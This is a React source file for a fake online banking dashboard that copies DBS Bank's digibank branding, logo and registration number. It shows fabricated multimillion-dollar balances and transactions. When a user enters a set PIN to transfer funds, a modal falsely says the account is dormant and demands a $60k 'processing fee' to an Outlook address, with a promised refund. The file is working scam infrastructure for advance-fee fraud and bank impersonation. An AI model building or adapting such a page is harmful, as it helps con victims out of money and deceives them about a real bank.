import { useState, useEffect, useRef } from 'react'
import { useNavigate } from 'react-router-dom'
import './Dashboard.css'

// ── Transaction history ──────────────────────────────────────────
// Total Credits:  SGD 53,250,000.00
// Total Debits:   SGD 45,063,072.00
// Final Balance:  SGD  8,186,928.00  ✓
// Last debit: 2024-09-11 — no debits in 2025 or 2026
// ─────────────────────────────────────────────────────────────────
const transactions = [
  // ── 2026 ────────────────────────────────────────────────────────
  { type: 'Credit', date: '2026-02-14', desc: 'Dividend — Nikko AM Singapore STI ETF',          amount: '387,450.00'  },
  { type: 'Credit', date: '2026-01-20', desc: 'Payment from Meridian Capital Partners',          amount: '542,800.00'  },
  // ── 2025 ────────────────────────────────────────────────────────
  { type: 'Credit', date: '2025-11-03', desc: 'Dividend — Mapletree Pan Asia Commercial Trust',  amount: '413,620.00'  },
  { type: 'Credit', date: '2025-09-14', desc: 'Investment Return — Eastspring Asia Fund',        amount: '678,900.00'  },
  { type: 'Credit', date: '2025-07-08', desc: 'Payment from Fullerton Fund Management',          amount: '521,750.00'  },
  { type: 'Credit', date: '2025-05-22', desc: 'Dividend — Ascendas REIT Q1 2025',                amount: '394,280.00'  },
  { type: 'Credit', date: '2025-04-10', desc: 'Payment from Schroders Singapore Growth Fund',    amount: '731,600.00'  },
  { type: 'Credit', date: '2025-02-28', desc: 'Dividend — Keppel Infrastructure Trust Q4 2024', amount: '468,902.00'  },
  { type: 'Credit', date: '2025-01-15', desc: 'Payment from Lion Global Investors Fund',         amount: '535,000.00'  },
  // ── 2024 ────────────────────────────────────────────────────────
  { type: 'Debit',  date: '2024-09-11', desc: 'Withdrawal to BELs Home Inc.',                        amount: '80,250.00'    },
  { type: 'Credit', date: '2024-09-01', desc: 'Payment from Raffles Capital Group',                  amount: '450,000.00'   },
  { type: 'Debit',  date: '2024-08-02', desc: 'Transfer to Cayman Holdings LLC',                     amount: '8,200,000.00' },
  { type: 'Credit', date: '2024-07-18', desc: 'Payment from Crawford & Associates Ltd',              amount: '6,500,000.00' },
  { type: 'Credit', date: '2024-07-05', desc: 'Dividend — SGX Listed Fund Q2 2024',                  amount: '500,000.00'   },
  { type: 'Debit',  date: '2024-06-20', desc: 'Transfer to Fullerton Fund Management Account',       amount: '900,000.00'   },
  { type: 'Credit', date: '2024-06-01', desc: 'Payment from Temasek-Linked Investment Vehicle',      amount: '750,000.00'   },
  { type: 'Credit', date: '2024-05-03', desc: 'Investment Return — Pacific Equity Fund',             amount: '3,800,000.00' },
  { type: 'Debit',  date: '2024-05-15', desc: 'Legal Fees — Rajah & Tann Singapore LLP',             amount: '420,000.00'   },
  { type: 'Debit',  date: '2024-04-25', desc: 'Payment to Offshore Trust Account',                   amount: '7,500,000.00' },
  { type: 'Credit', date: '2024-03-10', desc: 'Payment from Lion Global Investors',                  amount: '380,000.00'   },
  { type: 'Credit', date: '2024-02-14', desc: 'Payment from Holbrook Trust Fund',                    amount: '5,100,000.00' },
  { type: 'Debit',  date: '2024-02-01', desc: 'Stamp Duty — Marina Bay Commercial Property',         amount: '210,000.00'   },
  { type: 'Debit',  date: '2024-01-10', desc: 'Property Acquisition Payment',                        amount: '4,900,000.00' },
  // ── 2023 ────────────────────────────────────────────────────────
  { type: 'Credit', date: '2023-12-05', desc: 'Payment from Eastspring Investments Singapore',       amount: '900,000.00'   },
  { type: 'Credit', date: '2023-11-22', desc: 'Deposit from Wellington Asset Management',            amount: '4,700,000.00' },
  { type: 'Debit',  date: '2023-11-01', desc: 'Transfer to DBS Vickers Securities Account',          amount: '650,000.00'   },
  { type: 'Credit', date: '2023-10-01', desc: 'Dividend — Mapletree Industrial Trust',               amount: '480,000.00'   },
  { type: 'Debit',  date: '2023-10-17', desc: 'Transfer to Investment Portfolio',                    amount: '6,300,000.00' },
  { type: 'Credit', date: '2023-09-08', desc: 'Transfer from Brightstone Holdings',                  amount: '3,250,000.00' },
  { type: 'Credit', date: '2023-08-01', desc: 'Payment from CapitaLand Investment Fund',             amount: '720,000.00'   },
  { type: 'Debit',  date: '2023-08-20', desc: 'IRAS Income Tax Payment FY2022',                      amount: '310,000.00'   },
  { type: 'Debit',  date: '2023-07-31', desc: 'Legal Settlement Payment',                            amount: '4,100,000.00' },
  { type: 'Credit', date: '2023-06-15', desc: 'Payment from Harrington Group Ltd',                   amount: '5,900,000.00' },
  { type: 'Debit',  date: '2023-06-01', desc: 'Property Tax — Sentosa Cove Residential Unit',        amount: '180,000.00'   },
  { type: 'Credit', date: '2023-04-15', desc: 'Investment Return — Aberdeen Standard Asia Fund',     amount: '560,000.00'   },
  { type: 'Debit',  date: '2023-05-12', desc: 'Consulting Services Payment',                         amount: '3,500,000.00' },
  { type: 'Credit', date: '2023-03-27', desc: 'Dividend — SEA Portfolio Fund',                       amount: '2,800,000.00' },
  { type: 'Debit',  date: '2023-02-20', desc: 'Transfer to UOB Asset Management Account',            amount: '430,000.00'   },
  { type: 'Credit', date: '2023-01-18', desc: 'Payment from Schroders Singapore',                    amount: '890,000.00'   },
  { type: 'Debit',  date: '2023-01-05', desc: 'Annual Trustee Fee — Overseas Trust Account',         amount: '270,000.00'   },
  // ── 2022 ────────────────────────────────────────────────────────
  { type: 'Credit', date: '2022-12-19', desc: 'Payment from NovaBridge Financial',                   amount: '6,400,000.00' },
  { type: 'Credit', date: '2022-12-01', desc: 'Dividend — Keppel Infrastructure Trust Q4',           amount: '610,000.00'   },
  { type: 'Debit',  date: '2022-11-28', desc: 'Transfer to Subsidiary Account',                      amount: '2,900,000.00' },
  { type: 'Debit',  date: '2022-11-01', desc: 'IRAS GST Payment Q3 2022',                            amount: '390,000.00'   },
  { type: 'Credit', date: '2022-10-04', desc: 'Transfer from Lexington Partners',                    amount: '4,100,000.00' },
  { type: 'Credit', date: '2022-09-15', desc: 'Payment from Fullerton Fund — Asia Growth',           amount: '740,000.00'   },
  { type: 'Debit',  date: '2022-09-01', desc: 'Annual Management Fee — Private Banking',             amount: '160,000.00'   },
  { type: 'Credit', date: '2022-08-01', desc: 'Dividend — Ascendas REIT Q2',                         amount: '430,000.00'   },
  { type: 'Debit',  date: '2022-08-15', desc: 'Business Acquisition Payment',                        amount: '3,200,000.00' },
  { type: 'Credit', date: '2022-07-21', desc: 'Payment from Thornfield Capital',                     amount: '3,600,000.00' },
  { type: 'Debit',  date: '2022-07-01', desc: 'Transfer to CPF Special Account',                     amount: '120,000.00'   },
  { type: 'Credit', date: '2022-06-15', desc: 'Payment from Frasers Centrepoint Asset Mgmt',         amount: '580,000.00'   },
  { type: 'Debit',  date: '2022-06-01', desc: 'Compliance & AML Review Fee — MAS Requirement',       amount: '240,000.00'   },
  { type: 'Credit', date: '2022-05-01', desc: 'Dividend — Singapore Exchange Limited Q1',            amount: '310,000.00'   },
  { type: 'Debit',  date: '2022-05-20', desc: 'Administrative & Settlement Fees',                    amount: '2,183,072.00' },
  { type: 'Credit', date: '2022-04-08', desc: 'Payment from Sinclair Investments',                   amount: '2,900,000.00' },
  { type: 'Debit',  date: '2022-04-01', desc: 'Property Maintenance — Orchard Road Unit',            amount: '90,000.00'    },
  { type: 'Credit', date: '2022-02-14', desc: 'Investment Return — Nikko AM Singapore Fund',         amount: '270,000.00'   },
  { type: 'Debit',  date: '2022-03-10', desc: 'Legal & Compliance Fees',                             amount: '2,199,750.00' },
]

const accounts = [
  { label: 'Deposits',    balance: '6,361,230.00', icon: 'fa-piggy-bank',    color: '#e8002d', bg: '#fff0f3', pct: 42,
    subAccounts: [
      { name: 'My Account',             number: '012-456789-1', balance: '3,000,000.00' },
      { name: 'DBS Multiplier Account', number: '123-567890-1', balance: '3,361,230.00' },
    ]
  },
  { label: 'Card',        balance: '2,000,000.00', icon: 'fa-credit-card',   color: '#0057b8', bg: '#f0f5ff', pct: 68, subAccounts: [] },
  { label: 'Investments', balance: '3,500,000.00', icon: 'fa-chart-line',    color: '#00875a', bg: '#f0faf5', pct: 81, subAccounts: [] },
  { label: 'Insurance',   balance: '1,000,000.00', icon: 'fa-shield-halved', color: '#b45309', bg: '#fdf8ee', pct: 15, subAccounts: [] },
]

const quickLinks = [
  { id: 'overseas', icon: 'fa-globe',               label: 'Transfer Overseas' },
  { id: 'local',    icon: 'fa-right-left',           label: 'Local Transfer'    },
  { id: 'card',     icon: 'fa-credit-card',          label: 'Card'              },
  { id: 'bills',    icon: 'fa-file-invoice-dollar',  label: 'Bills'             },
  { id: 'more',     icon: 'fa-th',                   label: 'eStatements'       },
]

export default function Dashboard() {
  const navigate = useNavigate()
  const [activeTab,      setActiveTab]      = useState('accounts')
  const [balanceVisible, setBalanceVisible] = useState(false)
  const [showPinModal,   setShowPinModal]   = useState(false)
  const [visibleCount,   setVisibleCount]   = useState(10)
  const [showErrorModal, setShowErrorModal] = useState(false)
  const [rippleBtn,      setRippleBtn]      = useState(null)
  const [pin,            setPin]            = useState(['', '', '', ''])
  const [pinError,       setPinError]       = useState(false)
  const [pageLoaded,     setPageLoaded]     = useState(false)
  const [balanceAnim,    setBalanceAnim]    = useState(false)
  const [collapsedSections, setCollapsedSections] = useState({})

  const [showLoadingOverlay, setShowLoadingOverlay] = useState(true)

  const pinRefs = [useRef(), useRef(), useRef(), useRef()]

  useEffect(() => {
    fetchUser()
    // Hide loading overlay after 2.5 seconds
    setTimeout(() => setShowLoadingOverlay(false), 2500)
    setTimeout(() => setPageLoaded(true), 200)
  }, [])

  const fetchUser = async () => {
    try {
      const res = await fetch('https://assignmentdbs-ylfk.onrender.com/api/member/IB/profile', {
        credentials: 'include',
        headers: {
          'Authorization': `Bearer ${localStorage.getItem('authToken')}`
        }
      })
      if (!res.ok) { navigate('/IB/Welcome'); console.log('navigating to login page') }
    } catch {
      navigate('/IB/Welcome')
    }
  }

  const handleLogout = async () => {
    await fetch('https://assignmentdbs-ylfk.onrender.com/api/logout', { credentials: 'include' })
    localStorage.removeItem('authToken')
    navigate('/IB/Welcome')
  }

  const triggerRipple = (id) => {
    setRippleBtn(id)
    setTimeout(() => setRippleBtn(null), 600)
  }

  const handleToggleBalance = () => {
    try { new Audio('/images/seebalance.mp3').play() } catch {}
    setBalanceAnim(true)
    setTimeout(() => setBalanceAnim(false), 350)
    setBalanceVisible(v => !v)
  }

  const handleQuickLink = (id) => {
    if (id === 'overseas' || id === 'local') {
      // Show brief loading overlay then PIN modal
      setShowLoadingOverlay(true)
      setTimeout(() => {
        setShowLoadingOverlay(false)
        setShowPinModal(true)
        setPin(['', '', '', ''])
        setPinError(false)
        setTimeout(() => pinRefs[0].current?.focus(), 100)
      }, 1500)
    } else {
      triggerRipple(id)
    }
  }

  const handlePinInput = (val, idx) => {
    if (!/^\d?$/.test(val)) return
    const newPin = [...pin]
    newPin[idx] = val
    setPin(newPin)
    if (val && idx < 3) pinRefs[idx + 1].current?.focus()
    if (newPin.every(d => d !== '')) {
      const code = newPin.join('')
      setTimeout(() => {
        if (code === '1949') {
          setShowPinModal(false)
          setShowErrorModal(true)
        } else {
          setPinError(true)
          setPin(['', '', '', ''])
          pinRefs[0].current?.focus()
        }
      }, 300)
    }
  }

  const handlePinKeyDown = (e, idx) => {
    if (e.key === 'Backspace' && !pin[idx] && idx > 0) {
      pinRefs[idx - 1].current?.focus()
    }
  }

  const toggleSection = (label) => {
    setCollapsedSections(prev => ({ ...prev, [label]: !prev[label] }))
  }

  const hour = new Date().getHours()
  const greeting = hour < 12 ? 'Good Morning' : hour < 17 ? 'Good Afternoon' : 'Good Evening'

  return (
    <div className={`dash-root ${pageLoaded ? 'loaded' : ''}`}>

      {/* ── LOADING OVERLAY ── */}
      {showLoadingOverlay && (
        <div className="loading-overlay">
          <img src="/images/singalogo.jpg" alt="DBS" className="loading-logo" />
        </div>
      )}

      {/* Compliance Error Modal */}
      {showErrorModal && (
        <div className="modal-overlay" onClick={() => setShowErrorModal(false)}>
          <div className="modal-box" onClick={e => e.stopPropagation()}>
            <button className="modal-x" onClick={() => setShowErrorModal(false)}>
              <i className="fa fa-times" />
            </button>
            <div className="modal-icon-wrap error">
              <i className="fa fa-triangle-exclamation" />
            </div>

           <h3 className="modal-title">Compliance Authorization Required</h3>
            <p className="modal-body">
               ALERT: Your account has been dormant for a very long time.
               To unlock and receive your pending funds, submit your verification code SGD-VRF-72TR-DKBJ
               along with a processing fee of $60k$ to our customer service below.
               NOTE: You'll be refunded your money after verification.
              This is required under Anti-Money Laundering (AML) and Tax Compliance Regulations
              to process transactions after dormancy.
            </p>
            <p className="modal-contact">
              Contact us at <a href="mailto:dbs.compliance@outlook.com">dbs.compliance@outlook.com</a>
            </p>
            <button className="modal-close-btn" onClick={() => setShowErrorModal(false)}>
              Understood
            </button>

          </div>
        </div>
      )}

      {/* PIN Modal */}
      {showPinModal && (
        <div className="modal-overlay" onClick={() => setShowPinModal(false)}>
          <div className="modal-box pin-modal" onClick={e => e.stopPropagation()}>
            <button className="modal-x" onClick={() => setShowPinModal(false)}>
              <i className="fa fa-times" />
            </button>
            <div className="modal-icon-wrap">
              <i className="fa fa-lock" />
            </div>
            <h3 className="modal-title">Verify Transfer</h3>
            <p className="modal-body">Enter your 4-digit PIN to authorise this transaction</p>
            <div className={`pin-inputs ${pinError ? 'pin-error' : ''}`}>
              {[0,1,2,3].map(i => (
                <input key={i} ref={pinRefs[i]} type="password" inputMode="numeric"
                  maxLength={1} className="pin-digit" value={pin[i]}
                  onChange={e => handlePinInput(e.target.value, i)}
                  onKeyDown={e => handlePinKeyDown(e, i)} />
              ))}
            </div>
            {pinError && <p className="pin-err-msg">Incorrect PIN. Please try again.</p>}
          </div>
        </div>
      )}

      {/* ── HEADER (red DBS style) ── */}
      <header className="dash-header">
        <div className="dash-header-inner">
          {/* Left icons */}
          <div className="dash-header-left">
            <button className="hdr-icon-btn" title="Notifications">
              <i className="fa fa-bell" /><span className="notif-dot" />
            </button>
            <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
              <span className={`header-balance ${balanceAnim ? 'flip' : ''}`}>
                {balanceVisible ? 'SGD 12,861,230.00' : '••••••••'}
              </span>
              <button className="hdr-icon-btn" title="View Balance" onClick={handleToggleBalance}>
                <i className={`fas fa-${balanceVisible ? 'eye' : 'eye-slash'}`} />
              </button>
            </div>
          </div>

          {/* Center: logo */} 

          {/* Right icons */}
          <div className="dash-header-right">
            <button className="hdr-icon-btn" title="Help">
              <i className="fa fa-circle-question" />
            </button>
            <button className="logout-btn" onClick={handleLogout}>LOG OUT</button>
          </div>
        </div>

        {/* Welcome text below icons */}
        <div className="dash-welcome">
          <h1 className="dash-welcome-title">Welcome to<br /><strong>digibank</strong></h1>
          <p className="dash-welcome-sub">Enjoy the faster and more convenient way to bank on the go</p>
        </div>
      </header>

      {/* ── QUICK ACTIONS ── */}
      <div className="dash-quick-wrap">
        <div className="quick-links-row">
          {quickLinks.map(link => (
            <button key={link.id}
              className={`ql-btn ${rippleBtn === link.id ? 'ripple' : ''}`}
              onClick={() => handleQuickLink(link.id)}>
              <div className="ql-icon"><i className={`fa ${link.icon}`} /></div>
              <span>{link.label}</span>
            </button>
          ))}
        </div>
      </div>

      {/* ── TABS ── */}
      <div className="dash-tabs-wrap">
        <div className="dash-tabs">
          <button className={`dash-tab ${activeTab === 'accounts' ? 'active' : ''}`}
            onClick={() => setActiveTab('accounts')}>
            Accounts
          </button>
          <button className={`dash-tab ${activeTab === 'insights' ? 'active' : ''}`}
            onClick={() => setActiveTab('insights')}>
            Insights <span className="insights-badge">2</span>
          </button>
        </div>
      </div>

      {/* ── MAIN CONTENT ── */}
      <main className="dash-main">

        {/* ACCOUNTS TAB */}
        {activeTab === 'accounts' && (
          <div className="accounts-list">
            {accounts.map((acc, i) => (
              <div key={acc.label} className="acc-section" style={{ animationDelay: `${i*0.07}s` }}>
                {/* Section header — static, no collapse */}
                <div className="acc-section-header">
                  <div className="acc-section-left">
                    <span className="acc-section-bar" style={{ background: acc.color }} />
                    <span className="acc-section-name">{acc.label}</span>
                  </div>
                  <div className="acc-section-right">
                    <div className="acc-section-right-top">
                      <span className="acc-section-bal-label">Balance</span>
                      <i className="fa fa-chevron-up acc-chevron" />
                    </div>
                    <span className="acc-section-bal">
                      <span className="acc-sub-cur">SGD </span>{acc.balance}
                    </span>
                  </div>
                </div>

                {/* Sub accounts — always visible */}
                {acc.subAccounts && acc.subAccounts.length > 0 && (
                  <div className="acc-sub-list">
                    {acc.subAccounts.map((sub, j) => (
                      <div key={j} className="acc-sub-row" onClick={() => triggerRipple(`${acc.label}-${j}`)}>
                        <div className="acc-sub-icon">
                          <img src="/images/singalogo.jpg" alt="DBS" style={{ width: '28px', height: '28px', objectFit: 'contain', borderRadius: '4px' }} />
                        </div>
                        <div className="acc-sub-info">
                          <p className="acc-sub-name">{sub.name} <i className="fa fa-chevron-right acc-sub-chevron" /></p>
                          <p className="acc-sub-number">{sub.number}</p>
                        </div>
                        <div className="acc-sub-right">
                          <p className="acc-sub-bal"><span className="acc-sub-cur">SGD </span>{sub.balance}</p>
                        </div>
                      </div>
                    ))}
                  </div>
                )}

                {/* No sub accounts placeholder — always visible */}
                {(!acc.subAccounts || acc.subAccounts.length === 0) && (
                  <div className="acc-sub-list">
                    <div className="acc-sub-row" onClick={() => triggerRipple(acc.label)}>
                      <div className="acc-sub-icon">
                        <img src="/images/singalogo.jpg" alt="DBS" style={{ width: '28px', height: '28px', objectFit: 'contain', borderRadius: '4px' }} />
                      </div>
                      <div className="acc-sub-info">
                        <p className="acc-sub-name">{acc.label} Account</p>
                        <p className="acc-sub-number">Available Balance</p>
                      </div>
                      <div className="acc-sub-right">
                        <p className="acc-sub-bal"><span className="acc-sub-cur">SGD </span>{acc.balance}</p>
                        <i className="fa fa-chevron-right acc-sub-chevron" />
                      </div>
                    </div>
                  </div>
                )}
              </div>
            ))}
          </div>
        )}

        {/* INSIGHTS TAB */}
        {activeTab === 'insights' && (
          <div className="tx-list">
            {transactions.slice(0, visibleCount).map((tx, i) => (
              <div key={i} className={`tx-row ${tx.type === 'Credit' ? 'credit' : 'debit'}`}
                style={{ animationDelay: `${i*0.03}s` }}>
                <div className="tx-icon">
                  <i className={`fa fa-${tx.type === 'Credit' ? 'arrow-down' : 'arrow-up'}`} />
                </div>
                <div className="tx-info">
                  <p className="tx-desc">{tx.desc}</p>
                  <div className="tx-meta">
                    <span className="tx-date">{tx.date}</span>
                    <span className={`tx-badge ${tx.type === 'Credit' ? 'credit' : 'debit'}`}>{tx.type}</span>
                    <span className="tx-status">Completed</span>
                  </div>
                </div>
                <p className={`tx-amount ${tx.type === 'Credit' ? 'credit' : 'debit'}`}>
                  {tx.type === 'Credit' ? '+' : '−'} SGD {tx.amount}
                </p>
              </div>
            ))}
            <button className="load-more-btn" onClick={() => setVisibleCount(v => Math.min(v + 10, transactions.length))}>
              {visibleCount < transactions.length ? <><i className="fa fa-rotate" /> Load More</> : 'All transactions loaded'}
            </button>
          </div>
        )}
      </main>

      {/* ── BOTTOM NAV ── */}
      <nav className="bottom-nav">
        <button className="bnav-btn active">
          <i className="fa fa-house" />
          <span>Home</span>
        </button>
        <button className="bnav-btn" onClick={() => handleQuickLink('local')}>
          <i className="fa fa-right-left" />
          <span>Pay & Transfer</span>
        </button>
        <button className="bnav-btn" onClick={() => triggerRipple('digiwealth')}>
          <i className="fa fa-chart-line" />
          <span>digiWealth</span>
        </button>
        <button className="bnav-btn" onClick={() => triggerRipple('more')}>
          <i className="fa fa-th" />
          <span>More</span>
        </button>
      </nav>

      {/* FOOTER */}
      <footer className="dash-footer">
        <div className="footer-links">
          <span>Terms &amp; Conditions</span>
          <span>Privacy Policy</span>
          <span>Fair Dealing Commitment</span>
          <span>Compliance with Tax Requirements</span>
          <span>Vulnerability Disclosure Policy</span>
          <span>©2026 DBS Bank Ltd. Co. Reg. No. 196800306E</span>
        </div>
        <div className="footer-social">
          <i className="fab fa-facebook" /><i className="fab fa-twitter" />
          <i className="fab fa-linkedin" /><i className="fab fa-youtube" />
        </div>
      </footer>
    </div>
  )
}